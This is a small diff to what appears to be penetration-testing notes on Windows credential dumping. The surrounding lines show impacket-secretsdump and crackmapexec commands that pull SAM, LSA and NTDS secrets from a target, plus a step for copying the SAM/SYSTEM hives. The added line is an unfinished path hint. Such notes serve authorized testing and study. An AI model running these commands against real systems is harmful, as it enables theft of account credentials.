@@ -13,7 +13,7 @@ impacket-secretsdump <user>@<ip>
 crackmapexec smb <ip> -u <user> -p <password> --sam / --lsa / --ntds
 
 #IF you are NT SYSTEM
-Take a copy of SAM / SYSTEM.
+Take a copy of SAM / SYSTEM. -> check c:\windows\system32\xxx
 NEED TO ADD REG QUERY TO DO THIS HERE
 ```
 
